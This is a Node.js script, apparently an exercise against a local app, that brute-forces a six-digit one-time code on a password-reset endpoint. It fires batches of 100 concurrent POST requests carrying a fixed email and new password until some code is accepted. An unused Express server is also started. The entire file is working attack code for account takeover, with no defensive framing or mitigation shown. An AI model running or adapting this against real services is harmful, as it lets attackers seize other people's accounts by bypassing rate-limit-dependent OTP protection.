const express = require("express");
const app = express();
const axios = require("axios");
async function axiosCall(otp) {
  let data = JSON.stringify({
    email: "kirtikumar@gmail.com",
    newPassword: "1234567",
    otp: String(otp),
  });

  let config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "http://localhost:3000/reset-password",
    headers: {
      "Content-Type": "application/json",
    },
    data: data,
  };
  try {
    await axios.request(config);
  } catch (error) {}
}
async function main() {
    for (let i = 0; i < 1000000; i+=100) {
      const promises = [];
      console.log("here for " + i);
      for (let j = 0; j < 100; j++) {
        promises.push(axiosCall(i + j))
      }
      await Promise.all(promises);
    }
  }
  
  main()

app.listen(4000, () => {
  console.log("listening on port 4000");
});
